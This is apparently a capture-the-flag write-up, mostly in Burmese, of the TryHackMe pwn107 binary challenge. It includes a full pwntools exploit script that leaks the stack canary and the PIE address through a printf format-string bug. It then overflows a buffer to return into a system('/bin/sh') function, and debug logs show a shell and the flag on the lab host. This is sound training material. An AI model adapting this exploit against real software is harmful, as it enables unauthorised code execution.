

#### pwn107

```
File:     /home/Jackfruit/cate/learn/binary/stack/tryhackme/pwn107/pwn107-1644307530397.pwn107
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
pwndbg> 

```

security ကတော့တော်တော်ကောင်းတယ်
shell run ပေးမယ့် function  ရှိတယ်
main function ကိုကြည့်တော့  local_48 မှာ
`printf vuln`ရှိတယ် but  limit ရှိတယ် overflowလို့မရ
loopingလည်းမပတ် `printf` တစ်ခုတည်းကိုဘဲသုံးပြီး return address ကို overwrite ရမလား ဆိုပြီးစဉ်းစားနေတယ်

```c


void main(void)

{
  long in_FS_OFFSET;
  char local_48 [32];
  undefined1 local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts(&DAT_00100c68);
  puts(&DAT_00100c88);
  puts("You mailed about this to THM, and they responsed back with some questions");
  puts("Answer those questions and get your streak back\n");
  printf("THM: What\'s your last streak? ");
  read(0,local_48,0x14);
  printf("Thanks, Happy hacking!!\nYour current streak: ");
  printf(local_48);
  puts("\n\n[Few days latter.... a notification pops up]\n");
  puts(&DAT_00100db8);
  read(0,local_28,0x200);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                         /* WARNING: Subroutine does not return */
     __stack_chk_fail();
  }
  return;
}

```




```c

void get_streak(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  puts("This your last streak back, don\'t do this mistake again");
  system("/bin/sh");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                         /* WARNING: Subroutine does not return */
     __stack_chk_fail();
  }
  return;
}

```

```c
┌──(Jackfruit㉿kali)-[~/…/binary/stack/tryhackme/pwn107]
└─$ ./pwn107-1644307530397.pwn107
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107         

You are a good THM player 😎
But yesterday you lost your streak 🙁
You mailed about this to THM, and they responsed back with some questions
Answer those questions and get your streak back

THM: What's your last streak? hello
Thanks, Happy hacking!!
Your current streak: hello


[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩💻 - We miss you!😢


```


နောက်တစ်ခုက input ထပ်တောင်းတာတွေ့တယ်

```c
  puts("\n\n[Few days latter.... a notification pops up]\n");
  puts(&DAT_00100db8);
  read(0,local_28,0x200);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                         /* WARNING: Subroutine does not return */
     __stack_chk_fail();
  }
  return;
}
```

read နဲ့တောင်းတယ် overflow လို့ရတယ်
ဆိုတော့ ငါတို့ `printf` မှာ leak ခဲ့တာတွေကို buffer overflow ပြီးပြန်သုံးလို့ရတယ်

```c
pwndbg> tel 30
00:0000│ rdi rsp 0x7fffffffdb20 ◂— 0xa6f6c6c6568 /* 'hello\n' */
01:0008│-038     0x7fffffffdb28 ◂— 0
... ↓            5 skipped
07:0038│-008     0x7fffffffdb58 ◂— 0xe173ca075aed4600
08:0040│ rbp     0x7fffffffdb60 ◂— 1
09:0048│+008     0x7fffffffdb68 —▸ 0x7ffff7c29f68 (__libc_start_call_main+120) ◂— mov edi, eax
0a:0050│+010     0x7fffffffdb70 ◂— 0
0b:0058│+018     0x7fffffffdb78 —▸ 0x555555400992 (main) ◂— push rbp
0c:0060│+020     0x7fffffffdb80 ◂— 0x1ffffdc60
0d:0068│+028     0x7fffffffdb88 —▸ 0x7fffffffdc78 —▸ 0x7fffffffe008 ◂— '/home/Jackfruit/cate/learn/binary/stack/tryhackme/pwn107/pwn107-1644307530397.pwn107'
0e:0070│+030     0x7fffffffdb90 —▸ 0x7fffffffdc78 —▸ 0x7fffffffe008 ◂— '/home/Jackfruit/cate/learn/binary/stack/tryhackme/pwn107/pwn107-1644307530397.pwn107'
0f:0078│+038     0x7fffffffdb98 ◂— 0x7d4c9c0afe066d43
10:0080│+040     0x7fffffffdba0 ◂— 0
11:0088│+048     0x7fffffffdba8 —▸ 0x7fffffffdc88 —▸ 0x7fffffffe05d ◂— 'COLORFGBG=15;0'
12:0090│+050     0x7fffffffdbb0 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2f0 —▸ 0x555555400000 ◂— jg 0x555555400047
13:0098│+058     0x7fffffffdbb8 ◂— 0
14:00a0│+060     0x7fffffffdbc0 ◂— 0x82b363f548e46d43
15:00a8│+068     0x7fffffffdbc8 ◂— 0x82b3738fc0446d43
16:00b0│+070     0x7fffffffdbd0 ◂— 0
... ↓            3 skipped
1a:00d0│+090     0x7fffffffdbf0 —▸ 0x7fffffffdc88 —▸ 0x7fffffffe05d ◂— 'COLORFGBG=15;0'
1b:00d8│+098     0x7fffffffdbf8 ◂— 0xe173ca075aed4600
1c:00e0│+0a0     0x7fffffffdc00 ◂— 0

```

ဒီမှာဆိုငါတို့ leak ရမှာ က `stackcanary` ရယ် `get_streak` နဲ့နီးစပ်တဲ့ address ရယ်ဘဲ ဘာလို့ဆို `get_streak` ကိုအလွယ်တွက်လို့ရတယ်

```c
0b:0058│+018     0x7fffffffdb78 —▸ 0x555555400992 (main) ◂— push rbp
```

ဒီမှာဆို ဒီကောင့်ကိုသွားတွေ့တယ်
ငါတို့ သိထားရမှာ က PIE security မှာ address တွေက 3nibble (3 hex) တွေတူတယ် offset တွေတူတယ်

ဆိုတော့ 

```c
pwndbg> disas get_streak
Dump of assembler code for function get_streak:
   0x000055555540094c <+0>:     push   rbp
   0x000055555540094d <+1>:     mov    rbp,rsp
   0x0000555555400950 <+4>:     sub    rsp,0x10
   0x0000555555400954 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x000055555540095d <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000555555400961 <+21>:    xor    eax,eax
   0x0000555555400963 <+23>:    lea    rdi,[rip+0x2be]        # 0x555555400c28
   0x000055555540096a <+30>:    call   0x555555400710 <puts@plt>
   0x000055555540096f <+35>:    lea    rdi,[rip+0x2ea]        # 0x555555400c60
   0x0000555555400976 <+42>:    call   0x555555400730 <system@plt>
   0x000055555540097b <+47>:    nop
   0x000055555540097c <+48>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000555555400980 <+52>:    xor    rax,QWORD PTR fs:0x28
   0x0000555555400989 <+61>:    je     0x555555400990 <get_streak+68>
   0x000055555540098b <+63>:    call   0x555555400720 <__stack_chk_fail@plt>
   0x0000555555400990 <+68>:    leave
   0x0000555555400991 <+69>:    ret
End of assembler dump.

```

`0x555555400992`   -  `0x000055555540094c`  = decimal 70 ကွာတယ်
`0x555555400992` က `rdi` ကနေဆို 17 အကွာမှာရှိတယ်
`0xe173ca075aed4600` canary value က 13 အကွာမှာရှိတယ်
ဆိုတော့ python script နဲ့စမ်းကြည့်တယ် မရဘူး ဒီမှာ `system()` ကိုသုံးတဲ့အတွက် stack alignment လိုတယ်
`ret` တစ်ခုထည့်ရမယ် `rop gadget` ရှာရမယ် ဒါမဲ့ `PIE` ရှိတော့ ရှာရခက်တယ်
ဆိုတော့ `main ရဲ့ ret ` ကို `0x555555400992`  ကနေတွက်ပြီး သုံးရမယ်


```c
   0x0000555555400a6e <+220>:   nop
   0x0000555555400a6f <+221>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000555555400a73 <+225>:   xor    rax,QWORD PTR fs:0x28
   0x0000555555400a7c <+234>:   je     0x555555400a83 <main+241>
   0x0000555555400a7e <+236>:   call   0x555555400720 <__stack_chk_fail@plt>
   0x0000555555400a83 <+241>:   leave
   0x0000555555400a84 <+242>:   ret
End of assembler dump.

```


`0x555555400992`   -  `0x0000555555400a84` = -242(decimal)
`0x0000555555400a84` က ကြီးတဲ့အတွက်  `0x555555400992` ကို 242 ပေါင်းရမယ်


```python
from pwn import *


context.log_level = 'debug'
context.binary = "./pwn107-1644307530397.pwn107"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.128.220", 9007)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            break get_streak
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    p.recvuntil(b"last streak? ")
    p.sendline(b"%13$p.%17$p")
    p.recvuntil(b"current streak: ")
    adds = p.recvline()
    adds = adds.decode().strip().split(".")
    canary = int(adds[0], 16)
    print("the canary : ", hex(canary))
    print("leak main address", adds[1])
    shell = int(adds[1], 16) - 70
    ret = int(adds[1], 16) + 242
    print("the get_steak : ", hex(ret))
    payload = b"A" * 24 +  p64(canary) + b"A" *8   + p64(ret) + p64(shell)
    p.recvuntil(b"We miss you!")
    p.recvline()
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```

```c
    000001f0
[DEBUG] Sent 0xc bytes:
    b'%13$p.%17$p\n'
[DEBUG] Received 0xb9 bytes:
    00000000  54 68 61 6e  6b 73 2c 20  48 61 70 70  79 20 68 61  │Than│ks, │Happ│y ha│
    00000010  63 6b 69 6e  67 21 21 0a  59 6f 75 72  20 63 75 72  │ckin│g!!·│Your│ cur│
    00000020  72 65 6e 74  20 73 74 72  65 61 6b 3a  20 30 78 65  │rent│ str│eak:│ 0xe│
    00000030  38 36 62 31  32 30 61 39  36 64 32 33  38 30 30 2e  │86b1│20a9│6d23│800.│
    00000040  30 78 35 36  32 31 64 31  32 30 30 39  39 32 0a 0a  │0x56│21d1│2009│92··│
    00000050  0a 5b 46 65  77 20 64 61  79 73 20 6c  61 74 74 65  │·[Fe│w da│ys l│atte│
    00000060  72 2e 2e 2e  2e 20 61 20  6e 6f 74 69  66 69 63 61  │r...│. a │noti│fica│
    00000070  74 69 6f 6e  20 70 6f 70  73 20 75 70  5d 0a 0a 48  │tion│ pop│s up│]··H│
    00000080  69 20 70 77  6e 65 72 20  f0 9f 91 be  2c 20 6b 65  │i pw│ner │····│, ke│
    00000090  65 70 20 68  61 63 6b 69  6e 67 f0 9f  91 a9 e2 80  │ep h│acki│ng··│····│
    000000a0  8d f0 9f 92  bb 20 2d 20  57 65 20 6d  69 73 73 20  │····│· - │We m│iss │
    000000b0  79 6f 75 21  f0 9f 98 a2  0a                        │you!│····│·│
    000000b9
the canary :  0xe86b120a96d23800
leak main address 0x5621d1200992
the get_steak :  0x5621d1200a84
[DEBUG] Sent 0x39 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  00 38 d2 96  0a 12 6b e8  │AAAA│AAAA│·8··│··k·│
    00000020  41 41 41 41  41 41 41 41  84 0a 20 d1  21 56 00 00  │AAAA│AAAA│·· ·│!V··│
    00000030  4c 09 20 d1  21 56 00 00  0a                        │L· ·│!V··│·│
    00000039
[*] Switching to interactive mode
[DEBUG] Received 0x38 bytes:
    b"This your last streak back, don't do this mistake again\n"
This your last streak back, don't do this mistake again
[DEBUG] Received 0x1e bytes:
    b'Detaching from process 133219\n'
Detaching from process 133219
[DEBUG] Received 0x1e bytes:
    b'Detaching from process 133265\n'
Detaching from process 133265
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x1e bytes:
    b'Detaching from process 133266\n'
Detaching from process 133266
[DEBUG] Received 0x7d bytes:
    b'core.131436  core.71611  core.75659  core.88595  pwn107-1644307530397.pwn107\n'
    b'core.71009   core.75000  core.87143  exploit.py\n'
core.131436  core.71611  core.75659  core.88595  pwn107-1644307530397.pwn107
core.71009   core.75000  core.87143  exploit.py
[*] Process '/usr/bin/gdbserver' stopped with exit code 0 (pid 133219)
[DEBUG] Received 0x1c bytes:
    b'\n'


```


local မှာ python နဲ့ GDB ကိုတွဲပြီး runကြည့်တာရတယ်
shell ရပြီ

 remote မှာ run ကြည့်တယ်
 
```c
    00000060  74 65 72 2e  2e 2e 2e 20  61 20 6e 6f  74 69 66 69  │ter.│... │a no│tifi│
    00000070  63 61 74 69  6f 6e 20 70  6f 70 73 20  75 70 5d 0a  │cati│on p│ops │up]·│
    00000080  0a                                                  │·│
    00000081
the canary :  0x286d399a3825f900
leak main address 0x7ffeb8996fc8
the get_steak :  0x7ffeb89970ba
[DEBUG] Received 0x3a bytes:
    00000000  48 69 20 70  77 6e 65 72  20 f0 9f 91  be 2c 20 6b  │Hi p│wner│ ···│·, k│
    00000010  65 65 70 20  68 61 63 6b  69 6e 67 f0  9f 91 a9 e2  │eep │hack│ing·│····│
    00000020  80 8d f0 9f  92 bb 20 2d  20 57 65 20  6d 69 73 73  │····│·· -│ We │miss│
    00000030  20 79 6f 75  21 f0 9f 98  a2 0a                     │ you│!···│··│
    0000003a
[DEBUG] Sent 0x39 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  00 f9 25 38  9a 39 6d 28  │AAAA│AAAA│··%8│·9m(│
    00000020  41 41 41 41  41 41 41 41  ba 70 99 b8  fe 7f 00 00  │AAAA│AAAA│·p··│····│
    00000030  82 6f 99 b8  fe 7f 00 00  0a                        │·o··│····│·│
    00000039
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$  

```
EOF ဖြစ်တယ်မရဘူး စဉ်းစားစမ်း
တစ်ခုသိထားမိတာ 
အစောက gdb ကတော့ သူအဆင်ပြတဲ့ address ပေးတာဘဲ decompiled လုပ်ပြီး ဒါမဲ့ ဒီကောင်မှာ ပါတဲ့ lower 3 hexတွေကိုယုံလို့မရဘူး
offset ဘဲရတယ်
ဆိုတော့ python နဲ့ run တဲ့ script ကိုကြည့်တော့ 3 nibbles ကမတူဘူးဖြစ်နေတယ်
local leak `0x5621d1200992` နဲ့ remote leak  `0x7ffeb8996fc8` က နောက်ဆုံး 3hex မတူဘူး
canary value ကတော့မှားတာမဖြစ်နိုင်ဘူး
stack မှာရှုပ်ထွေးရှည်လျားတာ canary ဘဲရှိတယ်
ဆိုတော့ leak main address က 3 nibbles (lower 3 hex)မတူဘူး
rdi ကနေ အကွာအဝေးက Local နဲ့ remote stack မတူတာဖြစ်နိုင်တယ် 
ဆိုတော့ remote printf script စမ်းကြည့်မယ်

```c

──(Jackfruit㉿kali)-[~/…/binary/stack/tryhackme/pwn107]
└─$ nc  10.49.128.220 9007
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107         

You are a good THM player 😎
But yesterday you lost your streak 🙁
You mailed about this to THM, and they responsed back with some questions
Answer those questions and get your streak back

THM: What's your last streak? %13$p.%17$p
Thanks, Happy hacking!!
Your current streak: 0x4d9a4484174af200.0x7fff9b918c08
RV

[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩💻 - We miss you!😢

                                                                                                                                                             
┌──(Jackfruit㉿kali)-[~/…/binary/stack/tryhackme/pwn107]
└─$ nc  10.49.128.220 9007
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107         

You are a good THM player 😎
But yesterday you lost your streak 🙁
You mailed about this to THM, and they responsed back with some questions
Answer those questions and get your streak back

THM: What's your last streak? %13$p.%18$p        
Thanks, Happy hacking!!
Your current streak: 0x3be107d6b205dd00.0x19db4e7a0
▒V

[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩💻 - We miss you!😢

                                                                                                                                                             
┌──(Jackfruit㉿kali)-[~/…/binary/stack/tryhackme/pwn107]
└─$ nc  10.49.128.220 9007
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107         

You are a good THM player 😎
But yesterday you lost your streak 🙁
You mailed about this to THM, and they responsed back with some questions
Answer those questions and get your streak back

THM: What's your last streak? %13$p.%19$p
Thanks, Happy hacking!!
Your current streak: 0xe360bec694023800.0x561557400992
V

[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩💻 - We miss you!😢

```

နောက်ဆုံးတော့ lower 3 hex တူခဲ့ပြီ `0x561557400992`
local က stack လို 17 အကွာမှာရှိတာမဟုတ်ဘဲ
19 အကွာမှာရှိတယ်
ဆိုတော့ 
scriptကိုပြင်ရေးလိုက်မယ်


```python
from pwn import *


context.log_level = 'debug'
context.binary = "./pwn107-1644307530397.pwn107"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.128.220", 9007)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            break get_streak
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    p.recvuntil(b"last streak? ")
    p.sendline(b"%13$p.%19$p")
    p.recvuntil(b"current streak: ")
    adds = p.recvline()
    adds = adds.decode().strip().split(".")
    canary = int(adds[0], 16)
    print("the canary : ", hex(canary))
    print("leak main address", adds[1])
    shell = int(adds[1], 16) - 70
    ret = int(adds[1], 16) + 242
    print("the get_steak : ", hex(ret))
    payload = b"A" * 24 +  p64(canary) + b"A" *8   + p64(ret) + p64(shell)
    p.recvuntil(b"We miss you!")
    p.recvline()
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```

```c
    000000a0  e2 80 8d f0  9f 92 bb 20  2d 20 57 65  20 6d 69 73  │····│··· │- We│ mis│
    000000b0  73 20 79 6f  75 21 f0 9f  98 a2 0a                  │s yo│u!··│···│
    000000bb
the canary :  0x401bd48943cfce00
leak main address 0x55b379e00992
the get_steak :  0x55b379e00a84
[DEBUG] Sent 0x39 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  00 ce cf 43  89 d4 1b 40  │AAAA│AAAA│···C│···@│
    00000020  41 41 41 41  41 41 41 41  84 0a e0 79  b3 55 00 00  │AAAA│AAAA│···y│·U··│
    00000030  4c 09 e0 79  b3 55 00 00  0a                        │L··y│·U··│·│
    00000039
[*] Switching to interactive mode
[DEBUG] Received 0x38 bytes:
    b"This your last streak back, don't do this mistake again\n"
This your last streak back, don't do this mistake again
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x19 bytes:
    b'flag.txt\n'
    b'pwn107\n'
    b'pwn107.c\n'
flag.txt
pwn107
pwn107.c
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x2a bytes:
    b'THM{whY_i_us3d_pr1ntF()_w1thoUt_fmting??}\n'
THM{whY_i_us3d_pr1ntF()_w1thoUt_fmting??}

```


> [!NOTE]
> ငါတို့သတိထားရမှာက ret rop ရယ် remote နဲ့ local မှာရှိတဲ့ stack ပေါ်ကအကာအဝေးတွေရယ်
> gdb ရော ghidra က offset ကိုဘဲ ယုံပြီး lower 3 hex ကိုမသုံးဖို့ရယ်

